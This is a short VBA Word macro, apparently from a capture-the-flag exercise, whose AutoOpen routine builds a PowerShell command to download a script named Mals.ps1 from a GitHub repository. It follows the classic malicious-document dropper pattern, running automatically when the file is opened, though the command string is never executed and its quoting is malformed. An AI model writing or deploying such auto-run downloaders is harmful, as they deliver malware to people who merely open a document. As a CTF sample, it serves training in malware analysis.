Sub R1ghtPa7h()
'
' R1ghtPa7h Macro
' Keep Going :)
'
 WhereIsIt
End Sub
Sub AutoOpen()
 WhereIsIt
End Sub
Sub WhereIsIt()
 Dim str As String
 str = "powershell (New-Object"
System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MalwareDaddy/CCSIT_CTF/main/Mals.ps1',
'Mals.ps1')"
 Dim exePath As String
 exePath = ActiveDocument.Path + "\Mals.ps1"
 Wait (2)
End Sub
Sub Wait(n As Long)
 Dim t As Date
 t = Now
 Do
 DoEvents
 Loop Until Now >= DateAdd("s", n, t)
End Sub
